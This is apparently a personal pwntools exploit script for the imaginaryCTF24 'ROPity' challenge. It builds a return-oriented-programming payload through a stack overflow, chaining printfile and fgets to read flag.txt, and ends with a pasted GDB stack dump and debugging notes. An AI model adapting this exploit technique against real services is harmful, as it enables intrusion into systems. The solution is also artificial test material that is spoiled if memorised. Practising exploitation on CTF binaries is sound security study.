from pwn import *

from pwn import *
if args.REMOTE:
    io = remote(sys.argv[1],sys.argv[2])
else:
    io = process("./vuln", )
elf = context.binary = ELF("./vuln", checksec=False)


offset = 16

ret = 0x000000000040101a

pause()



# payload = b'A' + p64(0x00000041)
# payload += b'A'*(16-len(payload))
# payload += p64(ret)
# # payload += p64(elf.sym['printfile'])
# # payload += p64(elf.plt['fgets'])
# payload += p64(elf.sym['printfile'])

# io.sendline(payload)
# io.sendline(b'flag.txt')


payload = b'C'*8
payload += p64(0x404030+8)
payload += p64(ret)
# payload += p64(elf.plt['fgets'])
payload += p64(elf.sym['printfile'])
payload += p64(elf.plt['fgets'])
payload += p64(elf.sym['printfile'])

io.sendline(payload)

io.sendline(b'flag.txt\x00')
io.interactive()



'''
tele rsp 50
00:0000│ rsp 0x7fffffffdcc0 ◂— 0x0
01:0008│ rax 0x7fffffffdcc8 ◂— 0xa61616161 /* 'aaaa\n' */
02:0010│ rbp 0x7fffffffdcd0 ◂— 0x1
03:0018│+008 0x7fffffffdcd8 —▸ 0x7ffff7decc8a (__libc_start_call_main+122) ◂— mov edi, eax
04:0020│+010 0x7fffffffdce0 —▸ 0x7fffffffddd0 —▸ 0x7fffffffddd8 ◂— 0x38 /* '8' */
05:0028│+018 0x7fffffffdce8 —▸ 0x401136 (main) ◂— endbr64 
06:0030│+020 0x7fffffffdcf0 ◂— 0x100400040 /* '@' */
07:0038│+028 0x7fffffffdcf8 —▸ 0x7fffffffdde8 —▸ 0x7fffffffe163 ◂— '/home/gnapac/Desktop/CTF/imaginaryCTF24/ROPity/vuln'
08:0040│+030 0x7fffffffdd00 —▸ 0x7fffffffdde8 —▸ 0x7fffffffe163 ◂— '/home/gnapac/Desktop/CTF/imaginaryCTF24/ROPity/vuln'
09:0048│+038 0x7fffffffdd08 ◂— 0xfa4cef0150fd69d
0a:0050│+040 0x7fffffffdd10 ◂— 0x0
0b:0058│+048 0x7fffffffdd18 —▸ 0x7fffffffddf8 —▸ 0x7fffffffe197 ◂— 'SHELL=/bin/bash'
0c:0060│+050 0x7fffffffdd20 —▸ 0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2c0 ◂— 0x0
0d:0068│+058 0x7fffffffdd28 —▸ 0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401100 (__do_global_dtors_aux) ◂— endbr64 
0e:0070│+060 0x7fffffffdd30 ◂— 0xf05b310faccdd69d
0f:0078│+068 0x7fffffffdd38 ◂— 0xf05b214d8d89d69d
10:0080│+070 0x7fffffffdd40 ◂— 0x0
... ↓        2 skipped
13:0098│+088 0x7fffffffdd58 —▸ 0x7fffffffdde8 —▸ 0x7fffffffe163 ◂— '/home/gnapac/Desktop/CTF/imaginaryCTF24/ROPity/vuln'
14:00a0│+090 0x7fffffffdd60 ◂— 0x1
15:00a8│+098 0x7fffffffdd68 ◂— 0xd0bf68743e630900
16:00b0│+0a0 0x7fffffffdd70 —▸ 0x7fffffffdde0 ◂— 0x1
17:00b8│+0a8 0x7fffffffdd78 —▸ 0x7ffff7decd45 (__libc_start_main+133) ◂— mov r14, qword ptr [rip + 0x1ae244]
18:00c0│+0b0 0x7fffffffdd80 —▸ 0x401136 (main) ◂— endbr64 
19:00c8│+0b8 0x7fffffffdd88 —▸ 0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401100 (__do_global_dtors_aux) ◂— endbr64 
1a:00d0│+0c0 0x7fffffffdd90 —▸ 0x7ffff7ffe2c0 ◂— 0x0
1b:00d8│+0c8 0x7fffffffdd98 ◂— 0x0
1c:00e0│+0d0 0x7fffffffdda0 ◂— 0x0
1d:00e8│+0d8 0x7fffffffdda8 —▸ 0x401050 (_start) ◂— endbr64 
1e:00f0│+0e0 0x7fffffffddb0 —▸ 0x7fffffffdde0 ◂— 0x1
1f:00f8│+0e8 0x7fffffffddb8 ◂— 0x0
20:0100│+0f0 0x7fffffffddc0 ◂— 0x0



need RDX = _IO_2_1_stdin_


'''